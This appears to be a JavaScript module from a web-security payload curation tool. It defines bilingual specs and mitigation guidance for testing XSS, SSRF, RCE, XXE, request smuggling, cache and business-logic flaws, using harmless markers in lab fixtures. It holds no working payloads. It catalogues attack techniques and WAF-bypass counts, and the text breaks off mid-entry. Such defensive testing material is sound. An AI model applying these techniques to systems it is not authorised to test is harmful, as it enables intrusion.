import { writeFileSync } from 'node:fs';
import { join, resolve } from 'node:path';
import { pathToFileURL } from 'node:url';

import { loadCurationSnapshot } from './apply-payload-curation.mjs';

const i18n = (zh, en) => ({ zh, en });
const asList = value => Array.isArray(value) ? value : [];
const spec = (id, zh, en, family, executionCount, wafBypassCount, scopeZh, scopeEn) => ({
  id,
  name: i18n(zh, en),
  family,
  executionCount,
  wafBypassCount,
  scope: i18n(scopeZh, scopeEn),
});

export const remainingWebReviewSpecs = [
  spec('xss-reflected', '反射型 XSS 输出边界', 'Reflected XSS Output Boundary', 'xss', 5, 4, '验证请求参数是否未经上下文编码进入当前响应的可执行 HTML、属性或脚本位置。', 'Tests whether a request parameter reaches executable HTML, attribute, or script context in the current response without contextual encoding.'),
  spec('xss-stored', '存储型 XSS 持久化边界', 'Stored XSS Persistence Boundary', 'xss', 4, 2, '验证无害标记是否被持久化，并在不同查看者页面进入可执行浏览器上下文。', 'Tests whether a harmless marker is persisted and later enters an executable browser context for another viewer.'),
  spec('xss-dom', 'DOM XSS 源到汇边界', 'DOM XSS Source-to-Sink Boundary', 'xss', 4, 2, '验证 location、postMessage 等不可信源是否到达 innerHTML 等危险 DOM 汇。', 'Tests whether untrusted sources such as location or postMessage reach dangerous DOM sinks such as innerHTML.'),
  spec('xss-csp-bypass', 'CSP 回归与脚本来源审计', 'CSP Regression and Script-Source Audit', 'xss', 6, 2, '核对 CSP 是否限制脚本来源、内联执行、动态求值、base-uri 与对象加载，并区分策略缺口和 XSS 根因。', 'Reviews whether CSP constrains script sources, inline execution, dynamic evaluation, base-uri, and object loading while separating policy gaps from the underlying XSS flaw.'),
  spec('xss-mxss', '浏览器解析突变 XSS', 'Browser Parsing Mutation XSS', 'xss', 4, 1, '比较净化前后 DOM，确认浏览器修复或重排标记时是否重新形成可执行节点。', 'Compares the DOM before and after sanitization to determine whether browser repair or reparenting recreates an executable node.'),
  spec('xss-unicode', 'Unicode 与字符编码 XSS 边界', 'Unicode and Character-Encoding XSS Boundary', 'xss', 4, 2, '分别验证 JavaScript 转义、HTML 字符引用、全角字符、UTF-7 文本和非法 UTF-8 的实际解析上下文。', 'Separately validates JavaScript escapes, HTML character references, full-width characters, UTF-7 text, and invalid UTF-8 in their actual parsing contexts.'),
  spec('xss-filter-bypass', 'XSS 过滤与规范化差异', 'XSS Filtering and Canonicalization Differences', 'xss', 6, 2, '验证黑名单、大小写处理、标记修复和空白规范化是否在编码之前留下可执行差异。', 'Tests whether blacklists, case handling, markup repair, or whitespace normalization leaves an executable difference before output encoding.'),
  spec('xss-encoding', 'XSS 多层解码边界', 'XSS Multi-Stage Decoding Boundary', 'xss', 5, 2, '记录 URL、HTML 和 JavaScript 解码顺序，确认双重解码或错误上下文编码是否恢复可执行字符。', 'Records URL, HTML, and JavaScript decoding order to determine whether double decoding or wrong-context encoding restores executable characters.'),
  spec('xss-polyglot', 'XSS 多上下文输入边界', 'XSS Multi-Context Input Boundary', 'xss', 4, 1, '用单一无害标记识别输入落入的真实 HTML、属性、URL 或脚本上下文，不宣称存在通用载荷。', 'Uses one harmless marker to identify the actual HTML, attribute, URL, or script context without claiming that a universal payload exists.'),
  spec('xss-cookie-theft', 'XSS 会话 Cookie 暴露验证', 'XSS Session-Cookie Exposure Validation', 'xss', 5, 1, '验证测试 Cookie 的 HttpOnly、SameSite 与作用域，并以本地标记证明脚本执行，不向外部端点发送 Cookie。', 'Validates HttpOnly, SameSite, and scope for a test cookie and proves script execution with a local marker without sending cookies to an external endpoint.'),
  spec('xss-keylogger', 'XSS 输入事件访问边界', 'XSS Input-Event Access Boundary', 'xss', 4, 1, '仅用合成键盘事件确认注入脚本能否注册页面事件，不收集、缓存或传输真实用户输入。', 'Uses only a synthetic keyboard event to determine whether injected script can register page events without collecting, buffering, or transmitting real user input.'),

  spec('ssrf-basic', 'SSRF 最终连接目标验证', 'SSRF Final-Destination Validation', 'ssrf', 4, 3, '确认服务端取回器是否允许用户输入改变解析地址、最终连接 IP、端口或重定向目标。', 'Determines whether user input can change a server-side fetcher resolved address, final connected IP, port, or redirect destination.'),
  spec('ssrf-cloud-aws', 'AWS IMDSv2 SSRF 验证', 'AWS IMDSv2 SSRF Validation', 'ssrf', 4, 2, '在自有 EC2 实验实例中验证取回器是否能执行 IMDSv2 令牌流程，并只读取低敏感度实例字段。', 'Tests on an owned EC2 lab instance whether a fetcher can perform the IMDSv2 token flow while reading only lower-sensitivity instance fields.'),
  spec('ssrf-protocol', 'SSRF 非 HTTP Scheme 边界', 'SSRF Non-HTTP Scheme Boundary', 'ssrf', 5, 1, '验证取回器是否错误允许 file、dict、gopher 或 LDAP 等非业务协议连接受控夹具。', 'Tests whether a fetcher improperly permits non-business schemes such as file, dict, gopher, or LDAP against controlled fixtures.'),
  spec('ssrf-gopher', 'SSRF Gopher TCP 标记验证', 'SSRF Gopher TCP Marker Validation', 'ssrf', 5, 1, '向隔离字节记录监听器发送无害文本标记，只证明原始 TCP 可达性，不执行后端命令。', 'Sends a harmless text marker to an isolated byte-recording listener, proving raw TCP reachability without executing backend commands.'),
  spec('ssrf-dict', 'SSRF Dict 端口边界验证', 'SSRF Dict Port-Boundary Validation', 'ssrf', 4, 1, '使用隔离监听器确认 dict scheme 和目标端口是否可达，不把服务横幅或错误解释为命令执行。', 'Uses an isolated listener to test dict scheme and port reachability without interpreting a banner or error as command execution.'),
  spec('ssrf-file', 'SSRF File Scheme 沙箱读取', 'SSRF File-Scheme Sandbox Read', 'ssrf', 5, 1, '只读取专用沙箱中的固定标记文件，验证 file scheme 是否越过应用允许的网络取回边界。', 'Reads only a fixed marker file in a dedicated sandbox to test whether file scheme crosses the application network-fetch boundary.'),
  spec('ssrf-bypass', 'SSRF 地址规范化回归', 'SSRF Address Canonicalization Regression', 'ssrf', 6, 1, '对等价地址、用户信息、IPv6 和重定向执行统一解析后分类，不维护可直接用于真实内网的绕过清单。', 'Applies one post-resolution classification to equivalent addresses, userinfo, IPv6, and redirects rather than maintaining a bypass list for real internal networks.'),
  spec('ssrf-dns-rebinding', 'SSRF DNS 重解析固定验证', 'SSRF DNS Re-Resolution Pinning Validation', 'ssrf', 4, 1, '在双端均受控的重绑定夹具中比较校验和连接时的 DNS 答案，验证地址是否固定并重新分类。', 'Compares DNS answers at validation and connection in a fully controlled rebinding fixture to test address pinning and reclassification.'),
  spec('ssrf-redis', 'SSRF Redis PING 可达性验证', 'SSRF Redis PING Reachability Validation', 'ssrf', 5, 1, '仅向隔离 Redis 夹具发送 PING 帧，确认协议可达性，不写键、不改配置也不触发持久化。', 'Sends only a PING frame to an isolated Redis fixture to confirm protocol reachability without writing keys, changing configuration, or triggering persistence.'),

  spec('rce-command-injection', '操作系统命令注入无害标记', 'OS Command Injection Harmless Marker', 'rce', 5, 3, '使用 printf 固定标记证明参数到达命令解释器，不读取文件、不联网也不启动子任务。', 'Uses a fixed printf marker to prove that input reaches a command interpreter without reading files, using the network, or starting a secondary task.'),
  spec('rce-php', 'PHP 动态执行边界验证', 'PHP Dynamic-Execution Boundary Validation', 'rce', 4, 2, '在专用 PHP 夹具中只输出固定标记，区分字符串回显、模板插值和真正的服务端代码求值。', 'Outputs only a fixed marker in a dedicated PHP fixture to distinguish reflection, template interpolation, and actual server-side code evaluation.'),
  spec('rce-php-filter', 'PHP Filter 受控资源边界', 'PHP Filter Controlled-Resource Boundary', 'rce', 4, 1, '只对沙箱标记文件验证 php://filter 解析，禁止构造动态代码链或读取应用源码。', 'Validates php://filter only against a sandbox marker file and prohibits dynamic code chains or application-source reads.'),
  spec('rce-cmd-blind', '盲命令注入短延迟验证', 'Blind Command Injection Short-Delay Validation', 'rce', 5, 1, '使用一秒以内的固定延迟和服务端进程证据验证执行，排除网络抖动、缓存和重试。', 'Uses a fixed sub-second delay plus server process evidence to validate execution while excluding network jitter, caching, and retries.'),
  spec('rce-deserialize', '不安全反序列化类型边界', 'Unsafe Deserialization Type Boundary', 'rce', 4, 1, '使用无副作用 PayloaderMarker 类型验证不可信数据能否选择运行时类型或回调，不加载真实 gadget。', 'Uses a side-effect-free PayloaderMarker type to test whether untrusted data selects runtime types or callbacks without loading a real gadget.'),
  spec('rce-deserialize-php', 'PHP 反序列化类型边界', 'PHP Deserialization Type Boundary', 'rce', 4, 1, '使用专用无副作用 PHP 测试类验证 allowed_classes 和魔术方法边界，不操作文件或进程。', 'Uses a dedicated side-effect-free PHP test class to validate allowed_classes and magic-method boundaries without touching files or processes.'),
  spec('rce-deserialize-java', 'Java 反序列化类型边界', 'Java Deserialization Type Boundary', 'rce', 4, 2, '使用本地测试 DTO 验证 ObjectInputFilter 和允许类型，不分发 ysoserial 链或加载远程类。', 'Uses a local test DTO to validate ObjectInputFilter and allowed types without distributing ysoserial chains or loading remote classes.'),
  spec('rce-include', '服务端文件包含沙箱边界', 'Server-Side Include Sandbox Boundary', 'rce', 5, 1, '只包含沙箱中的静态标记模板，确认规范化路径和允许模板 ID 是否限制实际文件。', 'Includes only a static marker template in a sandbox to test whether canonical paths and allowed template IDs constrain the actual file.'),
  spec('rce-log-poison', '日志到模板解释边界', 'Log-to-Template Interpretation Boundary', 'rce', 2, 1, '把纯文本标记写入实验日志，再确认包含或查看路径是否错误地把日志内容当作代码。', 'Writes a plain marker to a lab log and tests whether an include or view path incorrectly treats log content as code.'),
  spec('rce-image', '图片元数据执行边界', 'Image-Metadata Execution Boundary', 'rce', 4, 1, '在固定测试图片中写入纯文本元数据，确认上传和处理链是否把元数据交给命令或模板解释器。', 'Writes plain text metadata into a fixed test image to determine whether upload and processing pass metadata to a command or template interpreter.'),
  spec('rce-htaccess', 'Web 服务器目录配置边界', 'Web-Server Directory Configuration Boundary', 'rce', 5, 1, '在隔离虚拟主机中验证上传目录是否接受目录级配置，并仅映射固定文本标记类型。', 'Tests in an isolated virtual host whether an upload directory accepts per-directory configuration while mapping only a fixed marker content type.'),

  spec('xxe-basic', 'XML 外部实体 OAST 验证', 'XML External-Entity OAST Validation', 'xxe', 4, 2, '使用自有 OAST 标记域确认解析器是否加载外部实体，不读取本地文件或云元数据。', 'Uses an owned OAST marker domain to determine whether the parser loads an external entity without reading local files or cloud metadata.'),
  spec('xxe-blind', '无回显 XXE 关联验证', 'Blind XXE Correlation Validation', 'xxe', 3, 1, '用唯一 DNS/HTTPS 标记关联解析器出站请求，要求服务日志与 OAST 时间戳同时成立。', 'Uses a unique DNS or HTTPS marker to correlate parser egress, requiring both service logs and OAST timestamps.'),
  spec('xxe-oob', 'XXE 带外实体加载验证', 'XXE Out-of-Band Entity-Load Validation', 'xxe', 3, 1, '只加载自有的最小外部 DTD 和标记实体，禁止把文件内容拼入带外请求。', 'Loads only an owned minimal external DTD and marker entity and prohibits embedding file content in the out-of-band request.'),
  spec('xxe-ssrf', 'XXE 到受控 HTTP 夹具验证', 'XXE-to-Controlled-HTTP Fixture Validation', 'xxe', 2, 1, '把外部实体指向受控内部标记服务，验证解析器出站边界而不访问真实内网。', 'Points an external entity to a controlled internal marker service to test parser egress without accessing a real internal network.'),
  spec('xxe-rce', 'XXE 到代码执行主张校验', 'XXE-to-Code-Execution Claim Validation', 'xxe', 2, 1, '把 XXE、PHP expect 扩展和命令执行视为独立前置条件，本条只验证安全的外部实体加载。', 'Treats XXE, the optional PHP expect extension, and command execution as independent prerequisites and validates only safe external-entity loading here.'),
  spec('xxe-file-read', 'XXE 沙箱文件实体验证', 'XXE Sandbox File-Entity Validation', 'xxe', 4, 1, '只引用 XML 沙箱中的固定标记文件，验证外部实体文件访问而不读取系统或应用文件。', 'References only a fixed marker file in an XML sandbox to validate file-entity access without reading system or application files.'),
  spec('xxe-dtd', '外部 DTD 加载边界验证', 'External DTD Loading Boundary Validation', 'xxe', 4, 1, '使用最小自有 DTD 和唯一标记验证参数实体加载，不嵌套文件读取或递归实体。', 'Uses a minimal owned DTD and unique marker to test parameter-entity loading without nested file reads or recursive entities.'),
  spec('xxe-xlsx', 'XLSX OOXML 解析器 XXE 验证', 'XLSX OOXML Parser XXE Validation', 'xxe', 2, 1, '明确检查 xl/workbook.xml 与工作表部件，并通过专用无数据 XLSX 夹具验证上传解析器。', 'Explicitly inspects xl/workbook.xml and worksheet parts and tests the upload parser with a dedicated data-free XLSX fixture.'),
  spec('xxe-docx', 'DOCX OOXML 解析器 XXE 验证', 'DOCX OOXML Parser XXE Validation', 'xxe', 2, 1, '明确检查 word/document.xml 与关系部件，并通过专用无数据 DOCX 夹具验证上传解析器。', 'Explicitly inspects word/document.xml and relationship parts and tests the upload parser with a dedicated data-free DOCX fixture.'),

  spec('thinkphp-rce', 'ThinkPHP 版本与路由执行回归', 'ThinkPHP Version and Route-Execution Regression', 'framework', 4, 2, '先固定框架版本、路由和补丁状态，再用无害标记验证特定动态调用边界，不泛化到所有 ThinkPHP。', 'Pins framework version, route, and patch status before using a harmless marker on a specific dynamic-call boundary without generalizing to every ThinkPHP deployment.'),
  spec('laravel-rce', 'Laravel 配置与反序列化回归', 'Laravel Configuration and Deserialization Regression', 'framework', 4, 1, '核对 Laravel 版本、APP_KEY 暴露、调试模式和反序列化入口，并只运行无害框架夹具。', 'Reviews Laravel version, APP_KEY exposure, debug mode, and deserialization entry points while running only a harmless framework fixture.'),
  spec('django-vuln', 'Django 版本与安全配置回归', 'Django Version and Security-Configuration Regression', 'framework', 4, 1, '按具体 Django 版本核对 ORM、DEBUG、签名和静态文件边界，不把不同版本问题拼成通用利用链。', 'Checks ORM, DEBUG, signing, and static-file boundaries for a specific Django version without combining unrelated version issues into a universal chain.'),

  spec('cache-poisoning', 'Web 缓存键与响应变体验证', 'Web Cache-Key and Response-Variant Validation', 'cache', 4, 2, '使用唯一无害响应头标记确认未键入输入能否改变共享缓存对象，不注入脚本或影响其他用户。', 'Uses a unique harmless response-header marker to test whether an unkeyed input changes a shared cached object without injecting script or affecting other users.'),
  spec('cache-deception', 'Web 缓存私有响应隔离验证', 'Web Cache Private-Response Isolation Validation', 'cache', 4, 3, '使用专用账号和不含隐私的标记响应，验证路径解析差异是否导致认证页面被共享缓存。', 'Uses a dedicated account and privacy-free marker response to test whether path parsing differences cause an authenticated page to enter a shared cache.'),

  spec('smuggling-cl-te', 'HTTP CL-TE 消息边界回归', 'HTTP CL-TE Message-Boundary Regression', 'smuggling', 3, 2, '在单用户实验代理链中发送一个带冲突 CL/TE 的固定标记请求，验证两端是否一致拒绝。', 'Sends one fixed-marker request with conflicting CL and TE through a single-user lab proxy chain to verify consistent rejection at both hops.'),
  spec('smuggling-cl-cl', 'HTTP 重复 Content-Length 拒绝回归', 'HTTP Duplicate Content-Length Rejection Regression', 'smuggling', 3, 3, '依据 RFC 9112 验证不同 Content-Length 值是否被整条代理链拒绝，不尝试访问管理路径。', 'Uses RFC 9112 expectations to verify that differing Content-Length values are rejected across the proxy chain without targeting an administrative path.'),
  spec('smuggling-te-cl', 'HTTP TE-CL 消息边界回归', 'HTTP TE-CL Message-Boundary Regression', 'smuggling', 3, 3, '在隔离 echo 后端比较前后端消息长度判断，并用唯一标记识别是否出现多余请求。', 'Compares message-length decisions at a lab front end and echo backend and uses a unique marker to identify any extra request.'),
  spec('smuggling-te-te', 'HTTP 重复 Transfer-Encoding 回归', 'HTTP Duplicate Transfer-Encoding Regression', 'smuggling', 3, 3, '验证多个或非法 Transfer-Encoding 是否在规范化前被拒绝，不维护针对具体产品的混淆清单。', 'Tests whether multiple or invalid Transfer-Encoding values are rejected before normalization without maintaining product-specific obfuscation lists.'),

  spec('biz-idor', '对象级授权跨账号验证', 'Cross-Account Object-Level Authorization Validation', 'business', 4, 1, '仅使用两个专用实验账号和一个固定对象，验证主体、对象与动作是否在服务端重新绑定。', 'Uses only two dedicated lab accounts and one fixed object to test whether subject, object, and action are rebound on the server.'),
  spec('biz-race-condition', '业务状态并发原子性验证', 'Business-State Concurrency Atomicity Validation', 'business', 4, 1, '最多并发两个可回滚实验请求，验证限额、余额或状态转换是否由原子事务保护。', 'Runs at most two reversible lab requests concurrently to test whether limits, balances, or state transitions are protected atomically.'),
  spec('biz-payment-tamper', '支付金额服务端重算验证', 'Server-Side Payment Amount Recalculation Validation', 'business', 4, 1, '只在支付沙箱和固定测试订单中修改客户端展示金额，确认服务端从商品与优惠规则重新计算。', 'Changes only a client-presented amount on a fixed payment-sandbox order to verify that the server recalculates from products and discount rules.'),
  spec('biz-password-reset', '密码重置令牌绑定验证', 'Password-Reset Token Binding Validation', 'business', 4, 1, '使用自有测试邮箱验证令牌的一次性、时效、账号绑定和可信链接来源，不枚举或爆破验证码。', 'Uses an owned test mailbox to validate one-time use, expiry, account binding, and trusted link origin without enumerating or brute-forcing codes.'),
  spec('biz-captcha-bypass', '验证码服务端消费验证', 'Server-Side CAPTCHA Consumption Validation', 'business', 4, 1, '使用一个专用验证码 ID 和一次正确/一次错误对照，验证服务端绑定、过期与单次消费。', 'Uses one dedicated CAPTCHA ID with one valid and one invalid control to test server-side binding, expiry, and single consumption.'),
];

const familyContent = {
  xss: {
    category: i18n('XSS 跨站脚本', 'Cross-Site Scripting'),
    difficulty: 'intermediate',
    principle: i18n('风险来自不可信输入在输出时进入与其编码方式不匹配的浏览器上下文，或在 DOM 中流入可执行汇。黑名单、CSP、WAF 和字符串替换都不能替代按 HTML、属性、URL、CSS 或 JavaScript 上下文执行编码与净化。', 'Risk arises when untrusted input reaches a browser context whose output encoding does not match that context, or flows into an executable DOM sink. Blacklists, CSP, WAFs, and string replacement do not replace HTML, attribute, URL, CSS, or JavaScript contextual encoding and sanitization.'),
    evidence: i18n('在隔离页面中先渲染普通文本基线，再提交只设置 window 本地布尔标记的样例。阳性必须由最终 DOM、实际事件执行和浏览器控制台共同确认，并排除字符串回显、查看源代码、CSP 报告模式和浏览器扩展影响。', 'Render a plain-text baseline in an isolated page, then submit a sample that only sets a local Boolean marker on window. Confirm a positive result with the final DOM, actual event execution, and browser console, excluding string reflection, view-source output, report-only CSP, and browser-extension effects.'),
    mitigation: i18n('按最终输出上下文使用框架编码器，对允许富文本使用维护中的 HTML sanitizer，禁止不可信值进入危险 DOM 汇，并将 CSP 作为纵深防护。Cookie 使用 HttpOnly、Secure 与合适 SameSite，修复后重放文本、标记和阴性编码对照。', 'Use framework encoders for the final output context, a maintained HTML sanitizer for permitted rich text, and prevent untrusted values from reaching dangerous DOM sinks, with CSP as defense in depth. Set HttpOnly, Secure, and appropriate SameSite on cookies, then replay text, marker, and negative encoding controls.'),
    references: ['https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html', 'https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html', 'https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP'],
  },
  ssrf: {
    category: i18n('SSRF 服务端请求伪造', 'Server-Side Request Forgery'),
    difficulty: 'advanced',
    principle: i18n('风险来自用户可控 URL、scheme、主机、端口、请求头或重定向跨越服务端出站信任边界。校验必须基于规范化后解析地址和最终连接目标，并在每次 DNS 解析与重定向后重新执行，不能只检查原始字符串。', 'Risk arises when user-controlled URLs, schemes, hosts, ports, headers, or redirects cross the server-side egress trust boundary. Validation must use canonicalized resolved addresses and the final connected destination and must repeat after every DNS resolution and redirect rather than checking only the original string.'),
    evidence: i18n('先请求自有 HTTPS 标记服务记录取回器身份、DNS、最终 IP、请求头、重定向和响应传播，再只对隔离内部夹具运行一个唯一标记。阳性需要夹具日志与应用出站日志同时出现相同标记；超时、状态码或 URL 被接受均不足。', 'First request an owned HTTPS marker service to record fetcher identity, DNS, final IP, headers, redirects, and response propagation, then run one unique marker only against an isolated internal fixture. A positive result requires the same marker in both fixture and application egress logs; a timeout, status code, or accepted URL is insufficient.'),
    mitigation: i18n('只允许业务必需的 http/https 目标与端口，规范化并解析后阻止回环、链路本地、私网和保留地址，固定连接 IP 与正确 Host/SNI，并在重定向后复检。禁止用户控制敏感请求头，通过网络策略限制元数据、数据库和管理网段。', 'Allow only business-required http and https destinations and ports; canonicalize and resolve before blocking loopback, link-local, private, and reserved addresses; pin the connected IP with correct Host and SNI; and revalidate redirects. Prevent user control of sensitive headers and restrict metadata, database, and management networks with egress policy.'),
    references: ['https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html', 'https://owasp.org/www-community/attacks/Server_Side_Request_Forgery'],
  },
  rce: {
    category: i18n('RCE 远程代码执行', 'Remote Code Execution'),
    difficulty: 'advanced',
    principle: i18n('风险来自不可信数据跨越字符串、模板、包含、反序列化或进程启动边界并被解释为代码、命令或运行时类型。确认必须区分输入回显、解析错误、可控计算、子进程创建和真正的权限影响。', 'Risk arises when untrusted data crosses a string, template, include, deserialization, or process-launch boundary and is interpreted as code, a command, or a runtime type. Confirmation must distinguish reflection, parser errors, controlled evaluation, child-process creation, and actual privilege impact.'),
    evidence: i18n('先用普通文本建立响应与日志基线，再执行只输出 PAYLOADER_RCE 固定标记或加载无副作用测试类型的样例。阳性必须由服务器端解释器、进程、类加载或模板日志与响应标记共同证明；不使用网络回连、敏感读取或持久化。', 'Establish response and log baselines with plain text, then run a sample that only emits a fixed PAYLOADER_RCE marker or loads a side-effect-free test type. A positive result requires matching server-side interpreter, process, class-loading, or template logs plus the response marker, without callbacks, sensitive reads, or persistence.'),
    mitigation: i18n('移除动态执行和 shell 拼接，使用固定 API、参数数组、允许模板 ID 与安全反序列化类型；上传和日志目录不可执行，运行账户采用最小权限与隔离。记录异常子进程、类型加载、包含路径和解析错误，并用同一标记回归。', 'Remove dynamic evaluation and shell concatenation; use fixed APIs, argument arrays, allowed template IDs, and safe deserialization types. Keep upload and log storage non-executable and run with least privilege and isolation. Audit anomalous child processes, type loading, include paths, and parser errors, then regress with the same marker.'),
    references: ['https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html', 'https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html'],
  },
  xxe: {
    category: i18n('XXE XML 外部实体', 'XML External Entity Injection'),
    difficulty: 'advanced',
    principle: i18n('风险来自解析不可信 XML 时允许 DTD、外部通用实体、参数实体或外部资源加载。解析器、库版本和文档容器决定真实行为，文件读取、SSRF、带外请求与代码执行是不同能力，不能由一个错误消息互相推导。', 'Risk arises when untrusted XML parsing permits DTDs, external general entities, parameter entities, or external resource loading. Parser, library version, and document container determine actual behavior; file reads, SSRF, out-of-band requests, and code execution are distinct capabilities and cannot be inferred from one error.'),
    evidence: i18n('使用唯一 PAYLOADER_XXE 标记、自有 HTTPS 接收端或 XML 沙箱文件运行单个样例，同时保存原始 XML、解析器配置、应用日志和接收端时间戳。只有实体内容进入输出或对应出站请求被同一事务关联时才确认，DOCTYPE 被接受并不等于实体已展开。', 'Run one sample with a unique PAYLOADER_XXE marker, an owned HTTPS receiver, or an XML sandbox file while preserving raw XML, parser configuration, application logs, and receiver timestamps. Confirm only when entity content reaches output or a matching outbound request correlates to the transaction; accepting a DOCTYPE does not prove entity expansion.'),
    mitigation: i18n('在所有 XML、SVG、SOAP 和 OOXML 导入路径禁用 DTD、外部实体与外部资源，使用安全解析器预设并限制出站网络与文件权限。对压缩文档限制大小、部件数量和解压比，并在修复后重放正常文档、DOCTYPE 阴性样例和标记样例。', 'Disable DTDs, external entities, and external resources across XML, SVG, SOAP, and OOXML import paths; use secure parser presets and restrict egress plus filesystem permissions. Limit archive size, part count, and expansion ratio, then replay a normal document, a DOCTYPE negative case, and the marker case after remediation.'),
    references: ['https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html', 'https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing'],
  },
  framework: {
    category: i18n('Web 框架安全回归', 'Web Framework Security Regression'),
    difficulty: 'advanced',
    principle: i18n('框架名称本身不是漏洞。有效结论必须绑定精确版本、启用组件、路由、配置和补丁状态，并证明不可信输入到达具体的 ORM、调试、签名、模板、反序列化或动态调用边界。不同 CVE 和配置问题不能拼成通用执行链。', 'A framework name is not a vulnerability. A valid conclusion binds the exact version, enabled component, route, configuration, and patch state and proves that untrusted input reaches a specific ORM, debug, signing, template, deserialization, or dynamic-call boundary. Different CVEs and configuration issues cannot be combined into one universal execution chain.'),
    evidence: i18n('在可回滚框架夹具中记录版本、依赖锁文件、路由与正常响应，再发送只返回 PAYLOADER_FRAMEWORK 标记的单变量样例。阳性需要版本条件、服务端堆栈或审计日志和标记结果一致；错误页、公开版本头或客户端响应修改均不足。', 'Record version, dependency lock file, route, and normal response in a reversible framework fixture, then send one single-variable sample that returns only a PAYLOADER_FRAMEWORK marker. A positive result requires matching version prerequisites, server stack or audit logs, and marker output; an error page, public version header, or client-side response edit is insufficient.'),
    mitigation: i18n('升级到供应商支持版本并应用安全补丁，关闭生产调试与动态调用，保护签名密钥，限制允许类型、路由参数和静态文件根目录。将依赖版本与安全配置纳入 CI，并使用相同正常和标记请求验证业务保留且边界差异消失。', 'Upgrade to a vendor-supported release and apply security patches; disable production debug and dynamic calls; protect signing keys; and constrain allowed types, route parameters, and static roots. Gate dependency versions and security settings in CI, then replay the same normal and marker requests to preserve behavior while removing the boundary difference.'),
    references: ['https://owasp.org/www-project-web-security-testing-guide/', 'https://cheatsheetseries.owasp.org/cheatsheets/Software_Supply_Chain_Security_Cheat_Sheet.html'],
  },
  cache: {
    category: i18n('Web 缓存安全', 'Web Cache Security'),
    difficulty: 'advanced',
    principle: i18n('风险来自缓存键和源站响应变体不一致，或缓存层与应用对路径、认证和私有响应的解释不同。单次 X-Cache、Age 或响应变化只能说明缓存行为，只有无会话客户端收到同一标记或私有变体时才构成跨用户影响。', 'Risk arises when cache keys omit origin response variants or when the cache and application disagree on paths, authentication, or private responses. One X-Cache, Age, or response change shows caching behavior only; cross-user impact requires a no-session client to receive the same marker or private variant.'),
    evidence: i18n('为专用测试路由生成唯一 PAYLOADER_CACHE 标记，按 miss、hit、不同会话和无会话顺序请求，并保存 Cache-Control、Vary、Age、缓存键日志和响应哈希。使用不含隐私的固定正文，发现共享污染后立即 purge，禁止影响真实用户。', 'Generate a unique PAYLOADER_CACHE marker for a dedicated test route and request it in miss, hit, different-session, and no-session order, preserving Cache-Control, Vary, Age, cache-key logs, and response hashes. Use a privacy-free fixed body, purge immediately on shared contamination, and do not affect real users.'),
    mitigation: i18n('让缓存键覆盖所有影响响应的已规范化输入，拒绝未批准的转发头，对认证和个性化响应设置 private/no-store 并正确使用 Vary。统一 CDN 与源站路径规范化，限制可缓存状态和扩展名，部署后 purge 旧对象并重复多会话回归。', 'Include every normalized input that affects the response in the cache key, reject unapproved forwarding headers, mark authenticated and personalized responses private or no-store, and use Vary correctly. Align CDN and origin path normalization, constrain cacheable statuses and extensions, purge old objects after deployment, and repeat multi-session regression.'),
    references: ['https://www.rfc-editor.org/rfc/rfc9111.html', 'https://owasp.org/www-project-web-security-testing-guide/'],
  },
  smuggling: {
    category: i18n('HTTP 请求走私', 'HTTP Request Smuggling'),
    difficulty: 'advanced',
    principle: i18n('请求走私来自同一持久连接上的两个 HTTP 组件对消息长度或字段规范化得出不同边界。RFC 9112 要求 Transfer-Encoding 覆盖 Content-Length，并要求拒绝不可恢复的歧义；一个 curl 状态码、服务器类型或单端超时不能证明前后端不同步。', 'Request smuggling arises when two HTTP components on one persistent connection derive different message boundaries from length or field normalization. RFC 9112 makes Transfer-Encoding override Content-Length and requires rejection of unrecoverable ambiguity; one curl status, server type, or single-hop timeout does not prove desynchronization.'),
    evidence: i18n('只在单用户实验代理链向 echo 后端发送一个 PAYLOADER_SMUGGLE 标记歧义请求，记录前端、后端和连接级日志以及请求计数。阳性必须证明一个输入在两端被分成不同数量或长度的请求；不发送管理路径，不等待或影响下一位用户请求。', 'Send one PAYLOADER_SMUGGLE ambiguity marker only through a single-user lab proxy chain to an echo backend, recording front-end, backend, connection logs, and request counts. A positive result must prove that one input became a different request count or length at the two hops; do not target administrative paths or wait for another user request.'),
    mitigation: i18n('在边缘统一使用严格 HTTP 解析，拒绝重复或冲突的长度字段、非法 Transfer-Encoding 和含糊空白，避免不安全的协议降级，并在转发前重建规范请求。升级所有代理和服务器，修复后重放正常请求与每个歧义阴性样例。', 'Use strict HTTP parsing at the edge; reject duplicate or conflicting length fields, invalid Transfer-Encoding, and ambiguous whitespace; avoid unsafe protocol downgrades; and reconstruct canonical requests before forwarding. Upgrade every proxy and server, then replay normal requests and every ambiguity negative case.'),
    references: ['https://www.rfc-editor.org/rfc/rfc9112.html', 'https://owasp.org/www-project-web-security-testing-guide/'],
  },
  business: {
    category: i18n('业务逻辑与授权', 'Business Logic and Authorization'),
    difficulty: 'intermediate',
    principle: i18n('业务风险来自服务器信任客户端对象标识、金额、状态、并发顺序或验证结果，而没有在每次请求中重新绑定主体、对象、动作和允许状态转换。客户端字段可修改或响应可拦截本身不是漏洞，必须出现服务器端未授权结果。', 'Business risk arises when the server trusts client object identifiers, amounts, state, concurrency order, or verification results without rebinding subject, object, action, and allowed transition on every request. Editable fields or intercepted responses alone are not vulnerabilities; an unauthorized server-side outcome is required.'),
    evidence: i18n('使用两个专用账号、固定沙箱对象和唯一 PAYLOADER_BUSINESS 标记记录正常基线，再只改变一个对象、金额、状态或顺序变量。阳性需要数据库状态、账本、审计日志或后续读取证明未授权结果；前端显示、HTTP 200 或修改客户端响应均不足。', 'Use two dedicated accounts, a fixed sandbox object, and a unique PAYLOADER_BUSINESS marker to record a normal baseline, then change only one object, amount, state, or ordering variable. A positive result requires database state, ledger, audit logs, or a follow-up read proving an unauthorized outcome; UI display, HTTP 200, or a modified client response is insufficient.'),
